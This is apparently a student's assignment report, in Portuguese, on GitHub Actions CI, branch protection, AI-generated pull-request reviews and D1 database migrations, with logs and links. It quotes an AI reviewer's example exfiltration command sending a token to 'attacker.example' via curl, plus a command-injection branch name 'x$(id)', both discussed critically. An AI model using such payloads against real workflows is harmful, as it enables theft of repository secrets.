# Avaliação: GitHub Actions com IA

Autor: Gabriel Fortunato (trabalho individual)
Repositório: https://github.com/gabriel-prime/oauth
Site: https://oauth-gabriel-fortunato.pages.dev

## Tarefa 1: CI a cada commit

- Execução verde: https://github.com/gabriel-prime/oauth/actions/runs/38637324393
- Execução vermelha: https://github.com/gabriel-prime/oauth/actions/runs/38637513479/job/116104335921
- Linha do log com o erro (passo "Aplica as migrações D1 em um SQLite local"):
  `Parse error near line 1: near ",": syntax error`, apontando a vírgula dupla em
  `CREATE TABLE quebrada (id INTEGER PRIMARY KEY,, nome TEXT);`

A migração é testada em um SQLite local porque o D1 é SQLite: um erro de sintaxe
aparece no CI, de graça e sem tocar no banco de produção, antes de o merge
disparar a aplicação remota.

Observação: o esqueleto excluía só `*.md` da busca por segredos, mas o próprio
`ci.yml` contém o padrão `GOCSPX-` e fazia o passo falhar sempre. Por isso ele
também exclui `.github/workflows/ci.yml`.

## Tarefa 2: main protegida

- PR bloqueado (com o erro da T1): https://github.com/gabriel-prime/oauth/pull/1 (commit a692722: `verificar` falhou nos eventos push e pull_request, ambos marcados como Required, e o botão "Merge pull request" ficou desabilitado com "Merging is blocked due to failing merge requirements")
- O mesmo PR liberado depois da correção: https://github.com/gabriel-prime/oauth/pull/1 (commit b6bb368 remove a migração quebrada: "All checks have passed", "Merging can be performed automatically" e botão de merge habilitado)
- `git push` direto na main recusado:

```
$ git push
remote: error: GH013: Repository rule violations found for refs/heads/main.
remote: Review all repository rules at https://github.com/gabriel-prime/oauth/rules?ref=refs%2Fheads%2Fmain
remote:
remote: - Changes must be made through a pull request.
remote:
remote: - Required status check "verificar" is expected.
remote:
To github.com:gabriel-prime/oauth.git
 ! [remote rejected] main -> main (push declined due to repository rule violations)
error: failed to push some refs to 'github.com:gabriel-prime/oauth.git'
```

## Tarefa 3: revisão de PR por IA

- PR com os dois comentários da IA: https://github.com/gabriel-prime/oauth/pull/2
  - Comentário 1 (commit b181f80, SQL com `'${email}'` interpolado): apontou SQL
    Injection em `functions/_shared/session.js:41-42` e sugeriu
    `prepare("... WHERE email = ?1").bind(email)`.
  - Comentário 2 (commit f72aeec, `synchronize` depois da correção): confirmou que
    `findSessionsByEmail` usa `prepare(...).bind(email)` e não achou mais SQL
    concatenado.
- Log do erro sem `pull-requests: write` (commit da06ae1):
  https://github.com/gabriel-prime/oauth/actions/runs/38641357548/job/116117373577

```
Run gh pr comment 2 --body-file "/tmp/modelResponse--2304-uLTI0d6gAQ7D-.txt"
GraphQL: Resource not accessible by integration (addComment)
Error: Process completed with exit code 1.
```

Explicação: quando um workflow declara `permissions`, toda permissão que não
aparece no bloco fica `none`. Com só `contents: read`, o `GITHUB_TOKEN` não pode
escrever no PR. A IA gerou a resposta normalmente, mas o `gh pr comment` foi
recusado na mutation `addComment`. Restaurar `pull-requests: write` resolveu.

Observação sobre a versão da ação: com `actions/ai-inference@v1`, como no
esqueleto, a primeira execução falhou
(https://github.com/gabriel-prime/oauth/actions/runs/38639223838) com
`Error: Cannot use 'in' operator to search for 'choices' in OK`. A v1 chama o
GitHub Models (`models.github.ai`) com o `GITHUB_TOKEN` e ignora o
`COPILOT_GITHUB_TOKEN`. O provedor Copilot só existe a partir da v2.1 e é o
único na v3, por isso o workflow usa `actions/ai-inference@v3`. As entradas e
saídas usadas (`prompt-file`, `system-prompt`, `response-file`) são as mesmas.
Com a v3, o Copilot CLI autenticou com o `COPILOT_PAT`, mas falhou com
`Model "gpt-4.1" from --model flag is not available` (log com debug:
https://github.com/gabriel-prime/oauth/actions/runs/38639546350/job/116112597224).
`gpt-4.1` é o modelo padrão da ação. Com `model: ""` a ação omite `--model` e
o CLI usa o modelo padrão do plano.

Crítica à IA (item 4): no segundo comentário do PR #2, a IA classificou como
HIGH uma injeção de comandos pela linha `git diff origin/${{ github.base_ref }}...HEAD`.
O exemplo que ela deu de branch maliciosa
(`curl https://attacker.example/?t=$COPILOT_GITHUB_TOKEN`) é impossível:
`git check-ref-format` recusa o nome, porque refs não aceitam espaço, `?` nem `:`.
A ideia geral não é absurda, já que um nome como `x$(id)` é válido, mas a
gravidade está exagerada. `base_ref` é a branch de destino do PR, que precisa
existir no próprio repositório. Só quem já tem permissão de escrita consegue
criá-la, e essa pessoa poderia simplesmente editar o workflow. PRs de forks,
que seriam o caso de atacante externo, nem recebem `secrets.COPILOT_PAT`. A
afirmação mistura um risco real, mas pequeno (passar o valor por `env:` é boa
prática), com um cenário de ataque e um exemplo que não se sustentam. No
primeiro comentário houve a inconsistência inversa: a SQL Injection real foi
marcada só como MEDIUM. Os dois comentários também terminam com sugestões de
chat ("Criar um SECURITY-REVIEW.md com o resumo"), que são irrelevantes num
comentário de PR. Por fim, na revisão seguinte (depois de restaurar
`pull-requests: write`), as linhas do workflow eram as mesmas, mas a IA não
repetiu o alerta HIGH do `base_ref` e só apontou o XPIA como MEDIUM. A mesma
entrada gerou conclusões diferentes. No PR #3
(https://github.com/gabriel-prime/oauth/pull/3) houve um erro de fato: a IA
disse que `npm install -g @github/copilot` "não é usado por nenhum comando
subsequente" e pediu para removê-lo. Mas a `actions/ai-inference@v3` executa
esse CLI, como mostra o log ("Running Copilot CLI: copilot -p <prompt> ...").
Remover o passo quebraria a revisão e o resumo.

## Tarefa 4: migrações D1 depois do merge

- Execução do merge com `migrations/0002_adiciona_coluna.sql` (PR #3, commit
  93728db): https://github.com/gabriel-prime/oauth/actions/runs/38642811095
- Bônus: o resumo gerado por IA aparece no Summary dessa execução ("Adicionou a
  coluna last_seen_at à tabela sessions. O tipo da coluna é INTEGER. [...] os
  registros existentes ficam com NULL.").
- Saída de `PRAGMA table_info(sessions)` (a coluna nova é `last_seen_at`, cid 7):

```
$ npx wrangler d1 execute oauth-sessions-gabriel --remote --command "PRAGMA table_info(sessions)"
🌀 Executing on remote database oauth-sessions-gabriel (4e10d5a4-8aee-4013-9194-f5a6bd23bb00):
┌─────┬──────────────┬─────────┬─────────┬────────────┬────┐
│ cid │ name         │ type    │ notnull │ dflt_value │ pk │
├─────┼──────────────┼─────────┼─────────┼────────────┼────┤
│ 0   │ id_hash      │ TEXT    │ 0       │ null       │ 1  │
│ 1   │ issuer       │ TEXT    │ 1       │ null       │ 0  │
│ 2   │ subject      │ TEXT    │ 1       │ null       │ 0  │
│ 3   │ email        │ TEXT    │ 0       │ null       │ 0  │
│ 4   │ display_name │ TEXT    │ 0       │ null       │ 0  │
│ 5   │ expires_at   │ INTEGER │ 1       │ null       │ 0  │
│ 6   │ created_at   │ INTEGER │ 1       │ null       │ 0  │
│ 7   │ last_seen_at │ INTEGER │ 0       │ null       │ 0  │
└─────┴──────────────┴─────────┴─────────┴────────────┴────┘
```

- Merge sem mudanças em `migrations/` (nenhuma execução de `migrar`): o PR #4
  (https://github.com/gabriel-prime/oauth/pull/4) só altera o `README.md`. O
  merge (commit bfe0a22, https://github.com/gabriel-prime/oauth/commit/bfe0a22)
  disparou apenas o `ci #26` na main. A lista do workflow `migrar`
  (https://github.com/gabriel-prime/oauth/actions/workflows/migrar.yml) continua
  com uma única execução, a #1 do merge do PR #3, porque o filtro
  `paths: ['migrations/**']` não casou com o push.

Observação: o esquema original tinha sido criado pelo console do D1. A
`0001_esquema_inicial.sql` usa `IF NOT EXISTS`, então a primeira aplicação
remota só a registra em `d1_migrations` sem recriar as tabelas.

## Perguntas

1. O push numa ramificação dispara o evento `push`, e como há um PR aberto para
   a main, o mesmo commit também dispara `pull_request` (`synchronize`). São duas
   execuções com o mesmo nome de check. A regra da main olha o check do commit
   que está no topo do PR; o que importa ali é a execução de `pull_request`, que
   testa o resultado do merge com a main.

2. Um workflow `pull_request` de um fork executa código que o autor do fork
   escreveu. Se recebesse os segredos, qualquer pessoa poderia abrir um PR que
   alterasse o workflow ou um script para imprimir `secrets.COPILOT_PAT` ou
   enviá-lo para fora. A regra impede o roubo de segredos por PR malicioso. Por
   padrão, o `GITHUB_TOKEN` desse PR também fica somente leitura. Em
   repositórios privados ou organizações, um administrador pode mudar isso nas
   opções "Send write tokens/secrets to workflows from fork pull requests", e é
   justamente por esse risco que elas vêm desligadas. (A revisão da IA no PR de
   entrega apontou que a frase original era categórica demais, e a observação
   procede.)

3. As permissões padrão do `GITHUB_TOKEN` podem ser amplas (escrita em quase
   tudo, dependendo da configuração do repositório ou da organização). Declarar
   `permissions` aplica o menor privilégio: leitura do código e escrita só em PRs.
   Se o passo que roda texto vindo do diff ou da IA for comprometido, o estrago
   fica limitado a comentar.

4. Não. A revisão da IA não é determinística e pode errar, como mostrou o item 4
   da Tarefa 3: ela inventou um exemplo de ataque impossível, marcou um risco
   pequeno como HIGH e uma SQL Injection real como MEDIUM, e o texto muda a
   cada execução para o mesmo código. O status check é uma verificação objetiva que passa ou falha
   sempre do mesmo jeito. A IA ajuda o revisor humano, mas não pode decidir o
   merge.
